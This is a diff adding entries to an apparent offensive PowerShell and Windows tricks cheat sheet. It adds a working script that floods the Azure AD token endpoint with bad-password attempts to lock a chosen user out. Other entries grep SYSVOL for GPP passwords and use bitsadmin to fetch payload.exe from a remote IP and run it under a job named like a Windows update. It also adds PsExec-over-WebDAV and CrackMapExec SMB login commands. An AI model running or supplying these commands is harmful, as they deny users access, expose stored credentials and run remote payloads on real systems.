@@ -1,5 +1,63 @@
 # PowerShell Tricks:
 
+## PowerShell Azure DoS:
+
+```powershell
+function Invoke-BruteForceDoS
+{
+    Param(
+            [Parameter(Mandatory=$True)]
+            [string]$User
+        )
+    while($true)
+    {
+        $randomGuid = New-Guid
+        $body = @{
+            "resource"   = $randomGuid
+            "client_id"  = $randomGuid
+            "grant_type" ="password"
+            "username"   = $User
+            "password"   = $randomGuid
+            "scope"      = "openid"
+        }
+
+        try
+        {
+            $response=Invoke-RestMethod -UseBasicParsing -Uri "https://login.microsoftonline.com/common/oauth2/token" -ContentType "application/x-www-form-urlencoded" -Method POST -Body $body
+        }
+        catch
+        {
+            $stream = $_.Exception.Response.GetResponseStream()
+            $responseBytes = New-Object byte[] $stream.Length
+
+            $stream.Position = 0
+            $stream.Read($responseBytes,0,$stream.Length) | Out-Null
+            
+            $errorDetails = [text.encoding]::UTF8.GetString($responseBytes) | ConvertFrom-Json | Select -ExpandProperty error_description
+
+            $datacenter = "{0,-6}" -f ($_.Exception.Response.Headers["x-ms-ests-server"].Split(" ")[2])
+        }
+            
+        # Parse the error code.
+        if(!$exists -and $errorDetails)
+        {
+            if($errorDetails.startsWith("AADSTS50053")) # The account is locked, you've tried to sign in too many times with an incorrect user ID or password.
+            {
+                Write-Host "$($datacenter): [ LOCKED ] $user" -ForegroundColor Red
+            }
+            elseif($errorDetails.StartsWith("AADSTS50126")) # Error validating credentials due to invalid username or password.
+            {
+                Write-Host "$($datacenter): [WRONGPWD] $user" -ForegroundColor Gray
+            }
+            elseif($errorDetails.StartsWith("AADSTS50034")) # The user account {identifier} does not exist in the {tenant} directory. To sign into this application, the account must be added to the directory.
+            {
+                Write-Host "$($datacenter): [NOTFOUND] $user" 
+            }
+        }
+    }
+}
+```
+
 ## PowerShell Port Scanning:
 
 Powershell Test-NetConnection, ```tnc``` for short, host and port scanning:
@@ -219,6 +277,19 @@ Password managers offer many benefits for selection and storage of passwords.
 ```
 PS C:\> $x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { Write-Host $y; $x=$y} }
 ```
+
+## PowerShell List Named Pipes:
+
+```
+ls \\.\pipe\
+```
+
+To run using ```cmd.exe```:
+
+```
+dir \\.\pipe\\
+```
+
 ## Python LM Hash Generation:
 
 ```
@@ -241,6 +312,13 @@ dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+```
+
+## Find GPP Passwords in SYSVOL:
+
+```
+findstr /S cpassword $env:logonserver\sysvol\*.xml
+findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
 ```
 
 ## Searching the Registry for Passwords:
@@ -756,3 +834,43 @@ Pixel 6 = R(0), G(0), B(0)
 7. Now save the picture using the ```File | Save``` as option and choose 24-bit Bitmap as the type.  I saved it as command.bmp
 8. Make a copy of the file and rename it to command.bat.
 9. Double click the file to run the batch file and you will open a command prompt!
+
+## BITS Jobs and Downloads:
+
+Starting with creating a job named “winupdatejob”, then we add the payload file in the job that we just created.
+
+```
+bitsadmin /addfile winupdatejob http://192.168.1.13/payload.exe C:\payload.exe
+```
+
+After adding the file, we use the /SetNotifyCmdLine switch to execute the payload. This is done with the help of an action that we scripted. First, it will start the cmd.exe and then, it will complete the download and then it will execute the said command in the background.
+
+```
+bitsadmin /SetNotifyCmdLine winupdatejob cmd.exe "/c bitsadmin.exe /complete winupdatejob | start /B C:\payload.exe"
+```
+
+After this, we run the /resume switch to get the download started.
+
+```
+bitsadmin /resume winupdatejob
+```
+
+## PSexec from WebDAV:
+
+```
+\\live.sysinternals.com\tools\PSExec64.exe -accepteula
+```
+
+## CrackMapExec Tips and Tricks:
+
+Null session:
+
+```
+crackmapexec smb 192.168.2.24 -u "" up ""
+```
+
+Connect to target using local account:
+
+```
+crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth
+```
